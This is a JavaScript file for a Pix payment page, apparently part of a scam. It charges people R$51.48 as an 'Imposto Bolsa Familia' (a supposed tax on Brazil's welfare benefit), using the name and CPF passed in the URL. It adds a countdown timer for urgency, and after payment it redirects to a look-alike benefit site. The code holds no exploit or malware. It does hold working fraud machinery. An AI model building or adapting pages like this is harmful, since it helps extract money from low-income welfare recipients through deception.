
let pixJaGerado = false;

function getParam(param) {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get(param);
}

function copiarPix() {
  const codigo = document.getElementById('pixCode').innerText;
  navigator.clipboard.writeText(codigo).then(() => {
    alert("Código Pix copiado!");
  });
}

function iniciarContador() {
  let tempo = 15 * 60;
  const contador = setInterval(() => {
    const minutos = String(Math.floor(tempo / 60)).padStart(2, '0');
    const segundos = String(tempo % 60).padStart(2, '0');
    document.getElementById("tempoRestante").innerText = `${minutos}:${segundos}`;
    tempo--;
    if (tempo < 0) clearInterval(contador);
  }, 1000);
}

function checarStatus(id, utms) {
  const verificar = setInterval(async () => {
    const res = await fetch(`/pix-status?id=${id}`);
    const data = await res.json();
    if (data.status === "PAID") {
      clearInterval(verificar);
      document.getElementById('statusText').innerHTML = "✅ Pagamento confirmado";
      setTimeout(() => {
        window.location.href = `https://novobeneficiobolsa.com.br/inicio/bolsa-up1/?${utms}`;
      }, 2000);
    }
  }, 10000);
}

function gerarPix() {
  if (pixJaGerado) return;
  pixJaGerado = true;

  const nome = getParam('nome') || "Cliente Teste";
  const cpf = getParam('cpf') || "00000000000";
  document.getElementById("nomeCliente").innerText = nome;
  document.getElementById("cpfCliente").innerText = cpf;

  const body = {
    identifier: "81xy74ektq",
    amount: 51.48,
    client: {
      name: nome,
      email: "default@email.com",
      phone: "(11) 99999-9999",
      document: cpf
    },
    products: [
      {
        id: "cmabolds900uzw7u9odlkozbn",
        name: "Imposto Bolsa Familia",
        quantity: 1,
        price: 51.48
      }
    ],
    dueDate: new Date(Date.now() + 10 * 60 * 1000).toISOString().split('.')[0] + 'Z',
    metadata: { origem: "automatica" },
    callbackUrl: "https://minha.api.com/pix/callback/ho5a2y9cdm"
  };

  fetch('/pix-duckfy', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  })
  .then(res => res.json())
  .then(data => {
    if (data.pix) {
      document.getElementById("qrCode").innerHTML = '<img src="data:image/png;base64,' + data.pix.base64 + '" alt="QR Code Pix">';
      document.getElementById("pixCode").innerText = data.pix.code;
      document.getElementById("statusText").innerText = "Aguardando pagamento PIX...";
      iniciarContador();

      const utms = window.location.search.slice(1);
      checarStatus(data.transactionId, utms);
    }
  });
}

// Espera 4 segundos para mostrar o Pix
window.addEventListener("DOMContentLoaded", () => {
  setTimeout(() => {
    document.getElementById("loading").style.display = "none";
    document.getElementById("pixBox").style.display = "block";
    gerarPix();
  }, 4000);
});
